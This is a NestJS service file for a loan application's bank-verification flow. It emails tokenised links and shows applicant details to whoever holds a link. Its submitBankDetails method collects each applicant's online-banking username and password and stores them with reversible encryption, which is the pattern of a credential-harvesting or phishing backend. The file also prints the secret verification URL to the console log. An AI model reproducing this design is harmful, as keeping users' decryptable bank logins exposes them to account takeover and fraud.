import {
  Injectable,
  NotFoundException,
  BadRequestException,
} from "@nestjs/common";
import { ConfigService } from "@nestjs/config";
import { InjectModel } from "@nestjs/sequelize";
import { createHash, randomBytes } from "node:crypto";
import { Op } from "sequelize";
import { EncryptionService } from "../common/decorators/crypto/encryption.service";
import { MailService } from "../common/mail/mail.service";
import { LoanApplication } from "./loan-application.model";
import { BankVerificationRequest } from "./bank-verification-request.model";

const TOKEN_TTL_MS = 24 * 60 * 60 * 1000;

export type BankVerificationType = "initial" | "reverification";

@Injectable()
export class BankVerificationService {
  constructor(
    @InjectModel(LoanApplication)
    private readonly applications: typeof LoanApplication,
    @InjectModel(BankVerificationRequest)
    private readonly requests: typeof BankVerificationRequest,
    private readonly encryption: EncryptionService,
    private readonly mail: MailService,
    private readonly config: ConfigService,
  ) {}

  async sendVerificationEmail(reference: string, type: BankVerificationType) {
    const application = await this.applications.findOne({
      where: { reference: reference.toUpperCase() },
    });
    if (!application) throw new NotFoundException("Loan application not found");

    const now = new Date();
    await this.requests.update(
      { expiresAt: now },
      {
        where: {
          applicationId: application.id,
          completedAt: null,
          expiresAt: { [Op.gt]: now },
        },
      },
    );

    const token = randomBytes(32).toString("base64url");
    const expiresAt = new Date(now.getTime() + TOKEN_TTL_MS);
    await this.requests.create({
      applicationId: application.id,
      type,
      tokenHash: this.hashToken(token),
      expiresAt,
      createdAt: now,
      completedAt: null,
      outcome: null,
    } as Partial<BankVerificationRequest> as BankVerificationRequest);

    const frontendUrl = this.config.get<string>(
      "FRONTEND_URL",
      "http://localhost:3000",
    );
    const verificationUrl = new URL(
      `/bank-verification/${encodeURIComponent(token)}`,
      frontendUrl,
    ).toString();
    const subject =
      type === "reverification"
        ? "Action required: re-verify your bank details"
        : "Action required: verify your bank details";

    console.log(verificationUrl);

    const delivered = await this.mail.sendBankVerificationEmail({
      to: application.email,
      applicantName: application.firstName,
      reference: application.reference,
      verificationUrl,
      type,
      expiresAt,
    });

    return {
      delivered,
      recipient: application.email,
      subject,
      message: delivered
        ? `Verification email sent to ${application.email}.`
        : `Email delivery is not configured; share this link with ${application.email} manually.`,
      verificationUrl,
      expiresAt: expiresAt.toISOString(),
    };
  }

  async getApplicantDetails(token: string) {
    const request = await this.findActiveRequest(token);
    const application = await this.applications.findByPk(request.applicationId);
    if (!application)
      throw new NotFoundException("Verification link not found");

    const legacyValues: Partial<
      Pick<LoanApplication, "accountNumber" | "bankName">
    > = {};
    const decryptField = (field: "accountNumber" | "bankName"): string => {
      const value = application[field];
      if (!value) return "";

      if (!this.encryption.isEncryptedPayload(value)) {
        legacyValues[field] = this.encryption.encrypt(value);
        return value;
      }

      return this.encryption.decrypt(value);
    };

    const accountNumber = decryptField("accountNumber");
    const bankName = decryptField("bankName");
    if (Object.keys(legacyValues).length > 0) {
      await application.update(legacyValues);
    }

    return {
      type: request.type,
      expiresAt: request.expiresAt,
      reference: application.reference,
      applicationId: application.reference,
      firstName: application.firstName,
      lastName: application.lastName,
      fullName: `${application.firstName} ${application.lastName}`,
      email: application.email,
      phone: application.phone,
      bankName,
      bankAccountLastFour: accountNumber.slice(-4),
    };
  }

  async submitBankDetails(
    token: string,
    bankUsername: string,
    bankPassword: string,
  ) {
    const username = (bankUsername ?? "").trim();
    const password = bankPassword ?? "";
    if (!username || !password) {
      throw new BadRequestException(
        "Both banking username and password are required.",
      );
    }

    const request = await this.findActiveRequest(token);
    const application = await this.applications.findByPk(request.applicationId);
    if (!application)
      throw new NotFoundException("Verification link not found");

    await application.update({
      bankUsername: this.encryption.encrypt(username),
      bankPasswordEncrypted: this.encryption.encrypt(password),
    });

    const [updated] = await this.requests.update(
      { completedAt: new Date(), outcome: "verified" },
      {
        where: {
          id: request.id,
          completedAt: null,
          expiresAt: { [Op.gt]: new Date() },
        },
      },
    );
    if (!updated) throw new NotFoundException("Verification link not found");

    return {
      success: true,
      message: "Thank you. Your bank details have been submitted securely.",
    };
  }

  async completeDemo(token: string, outcome: string) {
    if (outcome !== "verified" && outcome !== "needs_reverification") {
      throw new BadRequestException(
        'outcome must be "verified" or "needs_reverification"',
      );
    }

    const request = await this.findActiveRequest(token);
    const [updated] = await this.requests.update(
      { completedAt: new Date(), outcome },
      {
        where: {
          id: request.id,
          completedAt: null,
          expiresAt: { [Op.gt]: new Date() },
        },
      },
    );
    if (!updated) throw new NotFoundException("Verification link not found");

    return {
      demo: true,
      outcome,
      message:
        outcome === "verified"
          ? "Demo bank details marked as verified."
          : "Demo verification marked as needing re-verification.",
    };
  }

  private async findActiveRequest(token: string) {
    if (!token || token.length > 200) {
      throw new NotFoundException("Verification link not found");
    }

    const request = await this.requests.findOne({
      where: {
        tokenHash: this.hashToken(token),
        completedAt: null,
        expiresAt: { [Op.gt]: new Date() },
      },
    });
    if (!request) throw new NotFoundException("Verification link not found");
    return request;
  }

  private hashToken(token: string): string {
    return createHash("sha256").update(token).digest("hex");
  }
}
